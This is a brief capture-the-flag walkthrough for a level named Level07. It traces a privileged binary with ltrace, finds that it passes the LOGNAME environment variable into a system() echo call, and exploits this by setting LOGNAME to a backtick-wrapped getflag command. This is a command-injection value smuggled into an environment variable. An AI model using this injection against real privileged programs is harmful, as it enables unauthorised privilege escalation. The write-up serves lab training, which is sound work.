we can see that in home directory of  Level07 there is executable file with name level07 that has permission of the user flag07

ltrace : intercepts and records dynamic library calls which are called by an executed process and the signals received by that process.

$>ltrace ./Level07
[...]                                              = 0
getenv("LOGNAME")                                                                                  = "level07"
asprintf(0xbffff704, 0x8048688, 0xbfffff36, 0xb7e5ee55, 0xb7fed280)                                = 18
system("/bin/echo level07 "level07
[...]

we see that we getenv("LOGNAME") and we write the values using echo so we gonna change the `LOGNAME` value to '`getflag`' and run level07 again.

$>export LOGNAME='`getflag`'
$>./level07
